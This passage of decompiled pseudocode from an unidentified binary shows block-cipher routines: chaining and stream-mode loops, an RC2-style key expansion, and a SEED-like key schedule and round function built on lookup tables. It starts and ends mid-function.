    a5[2] = v9;
    *((_BYTE *)a5 + 6) = BYTE2(v9);
    result = HIBYTE(v9);
    *((_BYTE *)a5 + 7) = result;
  }
  else
  {
    v40 = a2;
    v41 = a1;
    v42 = (*((unsigned __int8 *)a5 + 3) << 24) | (*((unsigned __int8 *)a5 + 2) << 16) | *a5;
    v43 = (*((unsigned __int8 *)a5 + 7) << 24) | (*((unsigned __int8 *)a5 + 6) << 16) | a5[2];
    v44 = (int)(a3 - 8) < 0;
    v45 = a3 - 8;
    v75 = v43;
    v73 = a3 - 8;
    if ( !v44 )
    {
      v69 = (v45 + 8) >> 3;
      v73 = v45 - 8 * v69;
      do
      {
        v46 = *v41;
        v47 = v41[1];
        v48 = v41 + 1;
        v49 = *++v48;
        v64 = (v48[1] << 24) | (v49 << 16) | (v47 << 8) | v46;
        v48 += 2;
        v50 = v48[1];
        v70 = v64;
        v51 = *v48++;
        v52 = *++v48;
        v71 = (v48[1] << 24) | (v52 << 16) | (v50 << 8) | v51;
        v67 = v71;
        v41 = v48 + 2;
        sub_4B3970(&v70, a4);
        v53 = v71 ^ v75;
        v54 = v70 ^ v42;
        v55 = v40 + 1;
        *(v55 - 1) = v70 ^ v42;
        v42 = v64;
        *v55++ = BYTE1(v54);
        *v55++ = BYTE2(v54);
        *v55++ = HIBYTE(v54);
        *v55++ = v53;
        *v55 = BYTE1(v53);
        v43 = v67;
        *++v55 = BYTE2(v53);
        *++v55 = HIBYTE(v53);
        v40 = v55 + 1;
        v56 = v69-- == 1;
        v75 = v67;
      }
      while ( !v56 );
      v45 = v73;
    }
    if ( v45 != -8 )
    {
      v57 = *v41;
      v58 = v41[1];
      v59 = v41 + 1;
      v60 = *++v59;
      v65 = (v59[1] << 24) | (v60 << 16) | (v58 << 8) | v57;
      v70 = v65;
      v68 = ((v59[4] | (v59[5] << 8)) << 16) | (v59[3] << 8) | v59[2];
      v71 = v68;
      sub_4B3970(&v70, a4);
      v61 = v70 ^ v42;
      v62 = v71 ^ v75;
      v63 = (int)&v40[v73 + 8];
      switch ( v73 )
      {
        case 0xFFFFFFF9:
          goto LABEL_31;
        case 0xFFFFFFFA:
          goto LABEL_30;
        case 0xFFFFFFFB:
          goto LABEL_29;
        case 0xFFFFFFFC:
          goto LABEL_28;
        case 0xFFFFFFFD:
          goto LABEL_27;
        case 0xFFFFFFFE:
          goto LABEL_26;
        case 0xFFFFFFFF:
          goto LABEL_25;
        case 0u:
          *(_BYTE *)--v63 = HIBYTE(v62);
LABEL_25:
          *(_BYTE *)--v63 = BYTE2(v62);
LABEL_26:
          *(_BYTE *)--v63 = BYTE1(v62);
LABEL_27:
          *(_BYTE *)--v63 = v62;
LABEL_28:
          *(_BYTE *)--v63 = HIBYTE(v61);
LABEL_29:
          *(_BYTE *)--v63 = BYTE2(v61);
LABEL_30:
          *(_BYTE *)--v63 = BYTE1(v61);
LABEL_31:
          *(_BYTE *)(v63 - 1) = v61;
          break;
        default:
          break;
      }
      v43 = v68;
      v42 = v65;
    }
    *(_DWORD *)a5 = v42;
    a5[2] = v43;
    *((_BYTE *)a5 + 6) = BYTE2(v43);
    result = HIBYTE(v43);
    *((_BYTE *)a5 + 7) = result;
  }
  return result;
}

//----- (004B3FB0) --------------------------------------------------------
int *__cdecl sub_4B3FB0(char *a1, _BYTE *a2, int a3, int a4, unsigned __int16 *a5, int *a6, int a7)
{
  int *result; // eax
  int v8; // ebp
  int v9; // esi
  int v10; // edx
  unsigned __int16 v11; // ecx^2
  unsigned __int16 v12; // ecx^2
  char v13; // al
  int v14; // edx
  unsigned __int16 v15; // ecx^2
  unsigned __int16 v16; // ecx^2
  char v17; // al
  char v18; // cl
  int v19; // [esp+10h] [ebp-8h] BYREF
  int v20; // [esp+14h] [ebp-4h]

  result = a6;
  v8 = a3;
  v9 = *a6;
  if ( !a7 )
  {
    if ( a3 )
    {
      do
      {
        --v8;
        if ( !v9 )
        {
          v14 = *((unsigned __int8 *)a5 + 5);
          v19 = (*((unsigned __int8 *)a5 + 3) << 24) | (*((unsigned __int8 *)a5 + 2) << 16) | *a5;
          v20 = (v14 << 8) | *((unsigned __int8 *)a5 + 4) | (a5[3] << 16);
          sub_4B3830(&v19, a4);
          v15 = HIWORD(v19);
          *a5 = v19;
          a5[1] = v15;
          v16 = HIWORD(v20);
          a5[2] = v20;
          a5[3] = v16;
        }
        v17 = *a1++;
        v18 = *((_BYTE *)a5 + v9);
        *((_BYTE *)a5 + v9) = v17;
        *a2 = v18 ^ v17;
        v9 = ((_BYTE)v9 + 1) & 7;
        ++a2;
      }
      while ( v8 );
      result = a6;
    }
    goto LABEL_12;
  }
  if ( !a3 )
  {
LABEL_12:
    *result = v9;
    return result;
  }
  do
  {
    --v8;
    if ( !v9 )
    {
      v10 = *((unsigned __int8 *)a5 + 5);
      v19 = (*((unsigned __int8 *)a5 + 3) << 24) | (*((unsigned __int8 *)a5 + 2) << 16) | *a5;
      v20 = (v10 << 8) | *((unsigned __int8 *)a5 + 4) | (a5[3] << 16);
      sub_4B3830(&v19, a4);
      v11 = HIWORD(v19);
      *a5 = v19;
      a5[1] = v11;
      v12 = HIWORD(v20);
      a5[2] = v20;
      a5[3] = v12;
    }
    v13 = *((_BYTE *)a5 + v9) ^ *a1++;
    *a2 = v13;
    *((_BYTE *)a5 + v9) = v13;
    v9 = ((_BYTE)v9 + 1) & 7;
    ++a2;
  }
  while ( v8 );
  result = a6;
  *a6 = v9;
  return result;
}

//----- (004B41A0) --------------------------------------------------------
_WORD *__cdecl sub_4B41A0(unsigned __int16 *a1, _WORD *a2, int a3, int a4)
{
  int v4; // edx
  __int16 v5; // ecx^2
  __int16 v6; // ecx^2
  _WORD *result; // eax
  int v8; // [esp+0h] [ebp-8h] BYREF
  int v9; // [esp+4h] [ebp-4h]

  v4 = *((unsigned __int8 *)a1 + 5);
  v8 = (*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1;
  v9 = (v4 << 8) | *((unsigned __int8 *)a1 + 4) | (a1[3] << 16);
  if ( a4 )
    sub_4B3830(&v8, a3);
  else
    sub_4B3970(&v8, a3);
  v5 = HIWORD(v8);
  *a2 = v8;
  a2[1] = v5;
  v6 = HIWORD(v9);
  a2[2] = v9;
  result = a2 + 3;
  a2[3] = v6;
  return result;
}

//----- (004B4270) --------------------------------------------------------
int *__cdecl sub_4B4270(_BYTE *a1, _BYTE *a2, int a3, int a4, unsigned __int16 *a5, int *a6)
{
  int v6; // esi
  int v7; // ecx
  int v8; // edx
  int v9; // ecx
  unsigned int v11; // edx
  int v12; // ebx
  int *result; // eax
  _BYTE *v14; // eax
  int v15; // ecx
  int v16; // [esp+10h] [ebp-28h]
  int v17; // [esp+18h] [ebp-20h]
  int v18; // [esp+1Ch] [ebp-1Ch] BYREF
  unsigned int v19; // [esp+20h] [ebp-18h]
  int v20; // [esp+24h] [ebp-14h]
  _BYTE *v21; // [esp+28h] [ebp-10h]
  int v22; // [esp+2Ch] [ebp-Ch]
  unsigned int v23; // [esp+30h] [ebp-8h]

  v20 = a4;
  v6 = *a6;
  v17 = a3;
  v7 = *a5;
  v8 = *((unsigned __int8 *)a5 + 2);
  v21 = (char *)a5 + 1;
  v9 = (*((unsigned __int8 *)a5 + 3) << 24) | (v8 << 16) | v7;
  v11 = *((_DWORD *)a5 + 1);
  v12 = v9;
  v22 = v9;
  v19 = v11;
  v23 = v11;
  result = (int *)HIWORD(v11);
  v16 = 0;
  v18 = v9;
  if ( a3 )
  {
    do
    {
      --v17;
      if ( !v6 )
      {
        sub_4B3830(&v18, v20);
        v12 = v18;
        v23 = v19;
        ++v16;
        v22 = v18;
      }
      *a2 = *a1 ^ *((_BYTE *)&v22 + v6);
      result = (int *)(a1 + 1);
      ++a2;
      v6 = ((_BYTE)v6 + 1) & 7;
      ++a1;
    }
    while ( v17 );
    if ( v16 )
    {
      v14 = v21;
      *(_BYTE *)a5 = v12;
      *v14++ = BYTE1(v12);
      *v14 = BYTE2(v12);
      v15 = v19;
      *++v14 = HIBYTE(v12);
      v14[1] = v15;
      v14 += 2;
      *v14++ = BYTE1(v15);
      *v14 = BYTE2(v15);
      v14[1] = HIBYTE(v15);
      result = a6;
    }
    *a6 = v6;
  }
  else
  {
    *a6 = v6;
  }
  return result;
}

//----- (004B4460) --------------------------------------------------------
unsigned __int16 *__cdecl sub_4B4460(_BYTE *a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v5; // ecx
  _BYTE *v6; // edx
  int v7; // ebp
  char v8; // dl
  _BYTE *v9; // esi
  int v10; // edx
  int v11; // eax
  _BYTE *v12; // esi
  int v13; // ecx
  int v14; // ebx
  _DWORD *v15; // ecx
  unsigned __int16 *result; // eax
  int v17; // edx

  v4 = a2;
  *a1 = 0;
  if ( a2 > 128 )
    v4 = 128;
  v5 = a4;
  if ( a4 <= 0 || a4 > 1024 )
    v5 = 1024;
  if ( v4 > 0 )
  {
    v6 = a1;
    v7 = v4;
    do
    {
      *v6 = v6[a3 - (_DWORD)a1];
      ++v6;
      --v7;
    }
    while ( v7 );
  }
  v8 = a1[v4 - 1];
  if ( v4 < 128 )
  {
    v9 = &a1[-v4];
    do
    {
      v8 = byte_528828[(unsigned __int8)(v8 + v9[v4])];
      a1[v4++] = v8;
    }
    while ( v4 < 128 );
  }
  v10 = (v5 + 7) >> 3;
  v11 = 128 - v10;
  v12 = &a1[128 - v10];
  v13 = (unsigned __int8)byte_528828[(unsigned __int8)*v12 & (255 >> (-(char)v5 & 7))];
  *v12 = v13;
  if ( v10 != 128 )
  {
    do
    {
      v14 = (unsigned __int8)v12[v10 - 1];
      --v12;
      LOBYTE(v13) = byte_528828[v13 ^ v14];
      --v11;
      *v12 = v13;
    }
    while ( v11 );
  }
  v15 = a1 + 252;
  result = (unsigned __int16 *)(a1 + 126);
  v17 = 64;
  do
  {
    *v15-- = *result--;
    --v17;
  }
  while ( v17 );
  return result;
}

//----- (004B4560) --------------------------------------------------------
char __cdecl sub_4B4560(char *a1, char *a2, unsigned int a3, int a4, char *a5, int a6)
{
  if ( a6 )
    return (unsigned __int8)sub_4126B0(a1, a2, a3, a4, a5, (void (__cdecl *)(char *, char *, int))sub_4B5100);
  else
    return sub_412850(a1, a2, a3, a4, a5, (void (__cdecl *)(char *, int *, int))sub_4B5EC0);
}

//----- (004B4590) --------------------------------------------------------
unsigned int *__cdecl sub_4B4590(_BYTE *a1, _BYTE *a2, unsigned int a3, int a4, int a5, unsigned int *a6, int a7)
{
  return sub_412C00(a1, a2, a3, a4, a5, a6, a7, (void (__cdecl *)(int, int, int))sub_4B5100);
}

//----- (004B45D0) --------------------------------------------------------
_BYTE *__cdecl sub_4B45D0(unsigned __int8 *a1, _BYTE *a2, int a3, int a4)
{
  if ( a4 )
    return sub_4B5100(a1, a2, a3);
  else
    return sub_4B5EC0(a1, a2, a3);
}

//----- (004B4600) --------------------------------------------------------
unsigned int *__cdecl sub_4B4600(_BYTE *a1, _BYTE *a2, unsigned int a3, int a4, int a5, unsigned int *a6)
{
  return sub_412AF0(a1, a2, a3, a4, a5, a6, (int (__cdecl *)(int, int, int))sub_4B5100);
}

//----- (004B4630) --------------------------------------------------------
int *__cdecl sub_4B4630(unsigned __int8 *a1, int *a2)
{
  unsigned int v2; // edi
  unsigned int v3; // ebp
  unsigned int v4; // ecx
  unsigned int v5; // esi
  int *result; // eax
  unsigned int v7; // edx
  unsigned int v8; // ebp
  unsigned int v9; // ebx
  unsigned int v10; // edi
  unsigned int v11; // ecx
  unsigned int v12; // ebp
  unsigned int v13; // esi
  unsigned int v14; // edx
  unsigned int v15; // ebp
  unsigned int v16; // edi
  unsigned int v17; // ecx
  unsigned int v18; // ebp
  unsigned int v19; // esi
  unsigned int v20; // edx
  unsigned int v21; // ebp
  unsigned int v22; // edi
  unsigned int v23; // ecx
  unsigned int v24; // ebp
  unsigned int v25; // ecx
  unsigned int v26; // esi
  unsigned int v27; // edi
  int v28; // ebp
  unsigned int v29; // edx
  unsigned int v30; // ecx
  unsigned int v31; // [esp+10h] [ebp-4h]
  unsigned int v32; // [esp+1Ch] [ebp+8h]
  unsigned int v33; // [esp+1Ch] [ebp+8h]
  unsigned int v34; // [esp+1Ch] [ebp+8h]
  unsigned int v35; // [esp+1Ch] [ebp+8h]
  unsigned int v36; // [esp+1Ch] [ebp+8h]
  int v37; // [esp+1Ch] [ebp+8h]

  v2 = a1[3] | ((a1[2] | ((a1[1] | (*a1 << 8)) << 8)) << 8);
  v3 = a1[7] | ((a1[6] | ((a1[5] | (a1[4] << 8)) << 8)) << 8);
  v4 = a1[11] | ((a1[10] | ((a1[9] | (a1[8] << 8)) << 8)) << 8);
  v5 = a1[15] | ((a1[14] | ((a1[13] | (a1[12] << 8)) << 8)) << 8);
  result = a2;
  *a2 = dword_528928[(unsigned __int8)(v4 + v2 + 71)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v4 + v2 - 31161) >> 8)] ^ dword_529128[(unsigned __int8)((v4 + v2 + 1640531527) >> 16)] ^ dword_529528[(v4 + v2 + 1640531527) >> 24];
  a2[1] = dword_528928[(unsigned __int8)(v3 - v5 - 71)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v3 - v5 + 31161) >> 8)] ^ dword_529128[(unsigned __int8)((v3 - v5 - 1640531527) >> 16)] ^ dword_529528[(v3 - v5 - 1640531527) >> 24];
  v7 = (v2 >> 8) ^ (v3 << 24);
  v8 = (v3 >> 8) ^ (v2 << 24);
  a2[2] = dword_528928[(unsigned __int8)(v4 + BYTE1(v2) - 115)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v4 + v7 + 3213) >> 8)] ^ dword_529128[(unsigned __int8)((v4 + v7 - 1013904243) >> 16)] ^ dword_529528[(v4 + v7 - 1013904243) >> 24];
  a2[3] = dword_528928[(unsigned __int8)(v8 - v5 + 115)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v8 - v5 - 3213) >> 8)] ^ dword_529128[(unsigned __int8)((v8 - v5 + 1013904243) >> 16)] ^ dword_529528[(v8 - v5 + 1013904243) >> 24];
  v9 = (v5 << 8) ^ HIBYTE(v4);
  v10 = (v4 << 8) ^ HIBYTE(v5);
  a2[4] = dword_528928[(unsigned __int8)(HIBYTE(v5) + v7 + 26)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)((((_WORD)v4 << 8) ^ HIBYTE(v5)) + v7 + 6426) >> 8)] ^ dword_529128[(unsigned __int8)((v10 + v7 - 2027808486) >> 16)] ^ dword_529528[(v10 + v7 - 2027808486) >> 24];
  a2[5] = dword_528928[(unsigned __int8)(v8 - v9 - 26)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v8 - v9 - 6426) >> 8)] ^ dword_529128[(unsigned __int8)((v8 - v9 + 2027808486) >> 16)] ^ dword_529528[(v8 - v9 + 2027808486) >> 24];
  v11 = (v7 >> 8) ^ (v8 << 24);
  v12 = (v8 >> 8) ^ (v7 << 24);
  a2[6] = dword_528928[(unsigned __int8)(v10 + v11 + 52)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v10 + v11 + 12852) >> 8)] ^ dword_529128[(unsigned __int8)((v10 + v11 + 239350324) >> 16)] ^ dword_529528[(v10 + v11 + 239350324) >> 24];
  a2[7] = dword_528928[(unsigned __int8)(v12 - v9 - 52)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v12 - v9 - 12852) >> 8)] ^ dword_529128[(unsigned __int8)((v12 - v9 - 239350324) >> 16)] ^ dword_529528[(v12 - v9 - 239350324) >> 24];
  v13 = (v10 << 8) ^ HIBYTE(v9);
  v32 = (v9 << 8) ^ HIBYTE(v10);
  result[8] = dword_528928[(unsigned __int8)(v13 + v11 + 103)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v13 + v11 + 25703) >> 8)] ^ dword_529128[(unsigned __int8)((v13 + v11 + 478700647) >> 16)] ^ dword_529528[(v13 + v11 + 478700647) >> 24];
  result[9] = dword_528928[(unsigned __int8)(v12 - v32 - 103)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v12 - v32 - 25703) >> 8)] ^ dword_529128[(unsigned __int8)((v12 - v32 - 478700647) >> 16)] ^ dword_529528[(v12 - v32 - 478700647) >> 24];
  v14 = (v11 >> 8) ^ (v12 << 24);
  v15 = (v12 >> 8) ^ (v11 << 24);
  result[10] = dword_528928[(unsigned __int8)(v13 + v14 - 51)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v13 + v14 - 14131) >> 8)] ^ dword_529128[(unsigned __int8)((v13 + v14 + 957401293) >> 16)] ^ dword_529528[(v13 + v14 + 957401293) >> 24];
  result[11] = dword_528928[(unsigned __int8)(v15 - v32 + 51)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v15 - v32 + 14131) >> 8)] ^ dword_529128[(unsigned __int8)((v15 - v32 - 957401293) >> 16)] ^ dword_529528[(v15 - v32 - 957401293) >> 24];
  v16 = (v13 << 8) ^ HIBYTE(v32);
  v33 = (v32 << 8) ^ HIBYTE(v13);
  result[12] = dword_528928[(unsigned __int8)(v16 + v14 - 103)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v16 + v14 - 28263) >> 8)] ^ dword_529128[(unsigned __int8)((v16 + v14 + 1914802585) >> 16)] ^ dword_529528[(v16 + v14 + 1914802585) >> 24];
  result[13] = dword_528928[(unsigned __int8)(v15 - v33 + 103)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v15 - v33 + 28263) >> 8)] ^ dword_529128[(unsigned __int8)((v15 - v33 - 1914802585) >> 16)] ^ dword_529528[(v15 - v33 - 1914802585) >> 24];
  v17 = (v14 >> 8) ^ (v15 << 24);
  v18 = (v15 >> 8) ^ (v14 << 24);
  result[14] = dword_528928[(unsigned __int8)(v16 + v17 + 49)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v16 + v17 + 9009) >> 8)] ^ dword_529128[(unsigned __int8)((v16 + v17 - 465362127) >> 16)] ^ dword_529528[(v16 + v17 - 465362127) >> 24];
  result[15] = dword_528928[(unsigned __int8)(v18 - v33 - 49)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v18 - v33 - 9009) >> 8)] ^ dword_529128[(unsigned __int8)((v18 - v33 + 465362127) >> 16)] ^ dword_529528[(v18 - v33 + 465362127) >> 24];
  v19 = (v16 << 8) ^ HIBYTE(v33);
  v34 = (v33 << 8) ^ HIBYTE(v16);
  result[16] = dword_528928[(unsigned __int8)(v19 + v17 + 98)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v19 + v17 + 18018) >> 8)] ^ dword_529128[(unsigned __int8)((v19 + v17 - 930724254) >> 16)] ^ dword_529528[(v19 + v17 - 930724254) >> 24];
  result[17] = dword_528928[(unsigned __int8)(v18 - v34 - 98)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v18 - v34 - 18018) >> 8)] ^ dword_529128[(unsigned __int8)((v18 - v34 + 930724254) >> 16)] ^ dword_529528[(v18 - v34 + 930724254) >> 24];
  v20 = (v17 >> 8) ^ (v18 << 24);
  v21 = (v18 >> 8) ^ (v17 << 24);
  result[18] = dword_528928[(unsigned __int8)(v19 + v20 - 60)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v19 + v20 - 29500) >> 8)] ^ dword_529128[(unsigned __int8)((v19 + v20 - 1861448508) >> 16)] ^ dword_529528[(v19 + v20 - 1861448508) >> 24];
  result[19] = dword_528928[(unsigned __int8)(v21 - v34 + 60)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v21 - v34 + 29500) >> 8)] ^ dword_529128[(unsigned __int8)((v21 - v34 + 1861448508) >> 16)] ^ dword_529528[(v21 - v34 + 1861448508) >> 24];
  v22 = (v19 << 8) ^ HIBYTE(v34);
  v35 = (v34 << 8) ^ HIBYTE(v19);
  result[20] = dword_528928[(unsigned __int8)(v22 + v20 - 120)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v22 + v20 + 6536) >> 8)] ^ dword_529128[(unsigned __int8)((v22 + v20 + 572070280) >> 16)] ^ dword_529528[(v22 + v20 + 572070280) >> 24];
  v23 = v21;
  result[21] = dword_528928[(unsigned __int8)(v21 - v35 + 120)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v21 - v35 - 6536) >> 8)] ^ dword_529128[(unsigned __int8)((v21 - v35 - 572070280) >> 16)] ^ dword_529528[(v21 - v35 - 572070280) >> 24];
  v24 = (v21 >> 8) ^ (v20 << 24);
  v25 = (v20 >> 8) ^ (v23 << 24);
  result[22] = dword_528928[(unsigned __int8)(v22 + v25 + 15)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v22 + v25 + 13071) >> 8)] ^ dword_529128[(unsigned __int8)((v22 + v25 + 1144140559) >> 16)] ^ dword_529528[(v22 + v25 + 1144140559) >> 24];
  result[23] = dword_528928[(unsigned __int8)(v24 - v35 - 15)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v24 - v35 - 13071) >> 8)] ^ dword_529128[(unsigned __int8)((v24 - v35 - 1144140559) >> 16)] ^ dword_529528[(v24 - v35 - 1144140559) >> 24];
  v26 = (v22 << 8) ^ HIBYTE(v35);
  v36 = (v35 << 8) ^ HIBYTE(v22);
  result[24] = dword_528928[(unsigned __int8)(v26 + v25 + 29)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v26 + v25 + 26141) >> 8)] ^ dword_529128[(unsigned __int8)((v26 + v25 - 2006686179) >> 16)] ^ dword_529528[(v26 + v25 - 2006686179) >> 24];
  result[25] = dword_528928[(unsigned __int8)(v24 - v36 - 29)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v24 - v36 - 26141) >> 8)] ^ dword_529128[(unsigned __int8)((v24 - v36 + 2006686179) >> 16)] ^ dword_529528[(v24 - v36 + 2006686179) >> 24];
  v31 = (v25 >> 8) ^ (v24 << 24);
  v27 = (v24 >> 8) ^ (v25 << 24);
  result[26] = dword_528928[(unsigned __int8)(v26 + BYTE1(v25) + 58)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v26 + (v25 >> 8) - 13254) >> 8)] ^ dword_529128[(unsigned __int8)((v26 + v31 + 281594938) >> 16)] ^ dword_529528[(v26 + v31 + 281594938) >> 24];
  result[27] = dword_528928[(unsigned __int8)(v27 - v36 - 58)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v27 - v36 + 13254) >> 8)] ^ dword_529128[(unsigned __int8)((v27 - v36 - 281594938) >> 16)] ^ dword_529528[(v27 - v36 - 281594938) >> 24];
  v28 = (v26 << 8) ^ HIBYTE(v36);
  v37 = (v36 << 8) ^ HIBYTE(v26);
  result[28] = dword_528928[(unsigned __int8)(v31 + v28 + 115)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v31 + v28 - 26509) >> 8)] ^ dword_529128[(unsigned __int8)((v31 + v28 + 563189875) >> 16)] ^ dword_529528[(v31 + v28 + 563189875) >> 24];
  result[29] = dword_528928[(unsigned __int8)(v27 - v37 - 115)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v27 - v37 + 26509) >> 8)] ^ dword_529128[(unsigned __int8)((v27 - v37 - 563189875) >> 16)] ^ dword_529528[(v27 - v37 - 563189875) >> 24];
  v29 = ((v31 >> 8) ^ (v27 << 24)) + v28 + 1126379749;
  v30 = ((v27 >> 8) ^ (v31 << 24)) - v37 - 1126379749;
  result[30] = dword_528928[(unsigned __int8)v29] ^ dword_528D28[BYTE1(v29)] ^ dword_529128[BYTE2(v29)] ^ dword_529528[HIBYTE(v29)];
  result[31] = dword_528928[(unsigned __int8)v30] ^ dword_528D28[BYTE1(v30)] ^ dword_529128[BYTE2(v30)] ^ dword_529528[HIBYTE(v30)];
  return result;
}
// 528928: using guessed type int dword_528928[256];
// 528D28: using guessed type int dword_528D28[256];
// 529128: using guessed type int dword_529128[256];
// 529528: using guessed type int dword_529528[256];

//----- (004B5100) --------------------------------------------------------
_BYTE *__cdecl sub_4B5100(unsigned __int8 *a1, _BYTE *a2, int a3)
{
  int v4; // ecx
  unsigned int v6; // edx
  int v7; // edi
  int v8; // ebp
  unsigned int v9; // edx
  int v10; // esi
  int v11; // edi
  int v12; // ecx
  int v13; // esi
  int v14; // edi
  unsigned int v15; // edx
  int v16; // esi
  int v17; // edi
  int v18; // ecx
  int v19; // esi
  int v20; // edi
  unsigned int v21; // edx
  int v22; // esi
  int v23; // edi
  int v24; // ecx
  int v25; // esi
  int v26; // edi
  unsigned int v27; // edx
  int v28; // esi
  int v29; // edi
  int v30; // ecx
  int v31; // esi
  int v32; // edi
  unsigned int v33; // edx
  int v34; // esi
  int v35; // edi
  int v36; // ecx
  int v37; // esi
  int v38; // edi
  unsigned int v39; // edx
  int v40; // esi
  int v41; // edi
  int v42; // ecx
  int v43; // esi
  int v44; // edi
  unsigned int v45; // edx
  int v46; // esi
  int v47; // edi
  int v48; // ecx
  int v49; // esi
  int v50; // edi
  int v51; // ebx
  unsigned int v52; // esi
  int v53; // edx
  int v54; // esi
  int v55; // edi
  int v56; // ecx
  _BYTE *result; // eax
  int v58; // [esp+10h] [ebp-10h]
  int v59; // [esp+10h] [ebp-10h]
  int v60; // [esp+10h] [ebp-10h]
  int v61; // [esp+10h] [ebp-10h]
  int v62; // [esp+10h] [ebp-10h]
  int v63; // [esp+10h] [ebp-10h]
  int v64; // [esp+10h] [ebp-10h]
  int v65; // [esp+10h] [ebp-10h]
  int v66; // [esp+14h] [ebp-Ch]
  int v67; // [esp+14h] [ebp-Ch]
  int v68; // [esp+14h] [ebp-Ch]
  int v69; // [esp+14h] [ebp-Ch]
  int v70; // [esp+14h] [ebp-Ch]
  int v71; // [esp+14h] [ebp-Ch]
  int v72; // [esp+14h] [ebp-Ch]
  int v73; // [esp+14h] [ebp-Ch]
  int v74; // [esp+18h] [ebp-8h]
  int v75; // [esp+18h] [ebp-8h]
  int v76; // [esp+18h] [ebp-8h]
  int v77; // [esp+18h] [ebp-8h]
  int v78; // [esp+18h] [ebp-8h]
  int v79; // [esp+18h] [ebp-8h]
  int v80; // [esp+18h] [ebp-8h]
  int v81; // [esp+18h] [ebp-8h]
  int v82; // [esp+24h] [ebp+4h]
  int v83; // [esp+24h] [ebp+4h]
  int v84; // [esp+24h] [ebp+4h]
  int v85; // [esp+24h] [ebp+4h]
  int v86; // [esp+24h] [ebp+4h]
  int v87; // [esp+24h] [ebp+4h]
  int v88; // [esp+24h] [ebp+4h]
  int v89; // [esp+24h] [ebp+4h]
  int v90; // [esp+24h] [ebp+4h]
  int v91; // [esp+24h] [ebp+4h]
  int v92; // [esp+24h] [ebp+4h]
  int v93; // [esp+24h] [ebp+4h]
  int v94; // [esp+24h] [ebp+4h]
  int v95; // [esp+24h] [ebp+4h]
  int v96; // [esp+24h] [ebp+4h]
  int v97; // [esp+2Ch] [ebp+Ch]
  int v98; // [esp+2Ch] [ebp+Ch]
  int v99; // [esp+2Ch] [ebp+Ch]
  int v100; // [esp+2Ch] [ebp+Ch]
  int v101; // [esp+2Ch] [ebp+Ch]
  int v102; // [esp+2Ch] [ebp+Ch]
  int v103; // [esp+2Ch] [ebp+Ch]
  int v104; // [esp+2Ch] [ebp+Ch]
  int v105; // [esp+2Ch] [ebp+Ch]
  int v106; // [esp+2Ch] [ebp+Ch]
  int v107; // [esp+2Ch] [ebp+Ch]
  int v108; // [esp+2Ch] [ebp+Ch]
  int v109; // [esp+2Ch] [ebp+Ch]
  int v110; // [esp+2Ch] [ebp+Ch]
  int v111; // [esp+2Ch] [ebp+Ch]

  v4 = a1[11] | ((a1[10] | ((a1[9] | (a1[8] << 8)) << 8)) << 8);
  v58 = a1[15] | ((a1[14] | ((a1[13] | (a1[12] << 8)) << 8)) << 8);
  v97 = v4 ^ *(_DWORD *)a3;
  v6 = v58 ^ v97 ^ *(_DWORD *)(a3 + 4);
  v82 = dword_528928[(unsigned __int8)v6] ^ dword_528D28[BYTE1(v6)] ^ dword_529128[BYTE2(v6)] ^ dword_529528[HIBYTE(v6)];
  v7 = dword_528928[(unsigned __int8)(v82 + v97)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v82 + v97) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v82 + v97) >> 16)] ^ dword_529528[(unsigned int)(v82 + v97) >> 24];
  v8 = dword_528928[(unsigned __int8)(v7 + v82)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v7 + v82) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v7 + v82) >> 16)] ^ dword_529528[(unsigned int)(v7 + v82) >> 24];
  v66 = (v8 + v7) ^ (a1[3] | ((a1[2] | ((a1[1] | (*a1 << 8)) << 8)) << 8));
  v74 = v8 ^ (a1[7] | ((a1[6] | ((a1[5] | (a1[4] << 8)) << 8)) << 8));
  v9 = v74 ^ v66 ^ *(_DWORD *)(a3 + 8) ^ *(_DWORD *)(a3 + 12);
  v98 = v66 ^ *(_DWORD *)(a3 + 8);
  v83 = dword_528928[(unsigned __int8)v9] ^ dword_528D28[BYTE1(v9)] ^ dword_529128[BYTE2(v9)] ^ dword_529528[HIBYTE(v9)];
  v10 = dword_528928[(unsigned __int8)(v83 + v98)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v83 + v98) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v83 + v98) >> 16)] ^ dword_529528[(unsigned int)(v83 + v98) >> 24];
  v11 = dword_528928[(unsigned __int8)(v10 + v83)] ^ dword_528D28[(unsigned __int8)((unsigned __int16)(v10 + v83) >> 8)] ^ dword_529128[(unsigned __int8)((unsigned int)(v10 + v83) >> 16)] ^ dword_529528[(unsigned int)(v10 + v83) >> 24];
  v59 = v11 ^ v58;
